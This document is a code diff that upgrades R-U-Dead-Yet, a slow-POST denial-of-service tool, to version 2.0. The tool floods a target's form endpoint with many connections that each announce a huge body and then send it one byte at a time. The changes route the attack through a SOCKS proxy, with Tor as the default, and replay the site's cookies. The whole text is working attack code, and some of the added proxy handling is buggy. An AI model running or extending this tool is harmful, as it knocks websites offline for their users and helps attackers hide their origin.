@@ -1,6 +1,6 @@
 #!/usr/bin/env  python
 """
-    R-U-Dead-Yet version 1.0
+    R-U-Dead-Yet version 2.0
     Copyright 2010, Raviv Raz
     R-U-Dead-Yet is distributed under the terms of the GNU General Public License
     R-U-Dead-Yet is free software: you can redistribute it and/or modify
@@ -19,6 +19,7 @@
 """
 from sys import argv
 from multiprocessing import Process,Queue,freeze_support
+from socks import socksocket,PROXY_TYPE_SOCKS4
 import socket
 from BeautifulSoup import BeautifulSoup
 from urllib2 import urlopen
@@ -144,12 +145,18 @@ class Parser():
                                     self.get_values.append('')
 
 class connection:
-    def __init__(self,host,port,headers):
+    def __init__(self,host,port,headers,proxy_addr="",proxy_port=0):
         self.host = host
         self.port = port
         self.headers = headers
+        self.proxy_addr = proxy_addr
+        self.proxy_port = proxy_port
     def connect(self):
-        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        if self.proxy_addr != "":
+            self.s = socksocket()
+            self.s.setproxy(PROXY_TYPE_SOCKS4,"127.0.0.1",9050)
+        else:
+            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.connect((self.host,self.port))
         self.s.send(self.headers)
     def send(self,data):
@@ -158,13 +165,15 @@ class connection:
         self.s.close()
 
 class Client(Process): 
-    def __init__(self,host,port,headers): 
+    def __init__(self,host,port,headers,proxy_addr,proxy_port): 
         Process.__init__(self)
         self.host = host
         self.port = port
         self.headers = headers
+        self.proxy_addr = proxy_addr
+        self.proxy_port = proxy_port
     def run(self):
-        c = connection(self.host,self.port,self.headers)
+        c = connection(self.host,self.port,self.headers,self.proxy_addr,self.proxy_port)
         c.connect()
         while 1:
             c.send("A")
@@ -173,11 +182,15 @@ class Client(Process):
 def readConf():
     cfg = ConfigParser()
     cfg.read("rudeadyet.conf")
-    return cfg.get("parameters","URL"),int(cfg.get("parameters","number_of_connections")),cfg.get("parameters","attack_parameter")
+    return cfg.get("parameters","URL"),int(cfg.get("parameters","number_of_connections")),cfg.get("parameters","attack_parameter"),cfg.get("parameters","proxy_addr"),int(cfg.get("parameters","proxy_port"))
 if __name__ == "__main__":
+    proxy_addr = ""
+    proxy_port = 0
+    proxy_on = False
     freeze_support()
     if len(argv) == 2:
-        html = urlopen(argv[1]).read()
+        data = urlopen(argv[1])
+        html = data.read()
         p = Parser(argv[1],html)
         u = 0
         while u < 1 or u > len(p.getForms().keys()):
@@ -206,10 +219,23 @@ if __name__ == "__main__":
         else:
             num_of_processes = int(num)
         attack_parameter = params[p-1]
+        useProxy = str(raw_input("\nUse SOCKS proxy? [yes/no] (Default=no)\n> "))
+        if "y" in useProxy.lower():
+            proxy_on = True
+            proxy_addr = "127.0.0.1"
+            proxy_port = 9050
+            proxy_addr_input = str(raw_input("\nEnter proxy address: (Default=127.0.0.1)\n> ")).strip()
+            if proxy_addr_input != "":
+                proxy_addr = proxy_addr_input
+            proxy_port_input = raw_input("\nEnter proxy port: (Default=9050)\n> ")
+            if proxy_port_input != "":
+                proxy_port = int(proxy_addr_input)
     else:
         print "[!] Using configuration file"
         try:
-            attack_url,num_of_processes,attack_parameter = readConf()
+            attack_url,num_of_processes,attack_parameter,proxy_addr,proxy_port = readConf()
+            if proxy_addr != "":
+                proxy_on = True
         except:
             print "\n[x] No configuration file found.\nCreate rudeadyet.conf file or enter URL of page with form\n"
             raise SystemExit
@@ -218,10 +244,27 @@ if __name__ == "__main__":
         host = raw[:raw.find(":")]
     else:
         host = raw
+    data = urlopen(attack_url)
     path = urlparse(attack_url)[2]
-    print "\n[!] Attacking:",attack_url
+    print "[!] Attacking:",attack_url
     print "[!] With parameter:",attack_parameter
-    headers = """\
+    if proxy_on:
+        print "[!] Using proxy server at",proxy_addr+":"+str(proxy_port)
+    cookies = ""
+    header_list = str(data.info()).split('\n')
+    for header in header_list:
+        if "Set-Cookie" in header: cookies += "Cookie: "+header[header.find("""Set-Cookie: """)+12:]+"\n"
+    if cookies != "":
+        headers = """\
+POST %(path)s HTTP/1.1
+Host: %(host)s
+Connection: keep-alive
+Content-Length: 100000000
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
+%(cookies)s
+%(param)s="""%{"path":path,"host":host,"cookies":cookies,"param":attack_parameter}
+    else:
+        headers = """\
 POST %(path)s HTTP/1.1
 Host: %(host)s
 Connection: keep-alive
@@ -231,5 +274,5 @@ User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322
 %(param)s="""%{"path":path,"host":host,"param":attack_parameter}
     q = Queue()
     for i in range(num_of_processes):
-        p = Client(host,80,headers).start()
+        p = Client(host,80,headers,proxy_addr,proxy_port).start()
         q.put(p,False)
